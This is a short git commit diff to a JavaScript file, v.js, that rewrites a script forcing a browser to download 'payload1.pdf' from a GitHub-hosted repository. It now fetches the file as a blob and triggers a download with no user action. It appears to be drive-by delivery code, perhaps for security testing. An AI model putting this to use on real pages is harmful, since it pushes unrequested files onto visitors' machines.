2886823e5306e6419f42cc20b9916fb82b4bd98f
aillesiM <29269177+ener1-s3c@users.noreply.github.com>
2024-08-25 13:21:08 +0700

    ok imma update it

--- v.js
+++ v.js
@@ -1,6 +1,11 @@
-var link = document.createElement("a");
-link.href = "https://raw.githubusercontent.com/ener1-s3c/ener1-s3c.github.io/master/payload1.pdf";
-link.download = "payload1.pdf";
-document.body.appendChild(link);
-link.click();
-document.body.removeChild(link);
+fetch("https://raw.githubusercontent.com/ener1-s3c/ener1-s3c.github.io/master/payload1.pdf")
+  .then(response => response.blob())
+  .then(blob => {
+    var link = document.createElement("a");
+    link.href = window.URL.createObjectURL(blob);
+    link.download = "payload1.pdf";
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+  })
+  .catch(console.error);
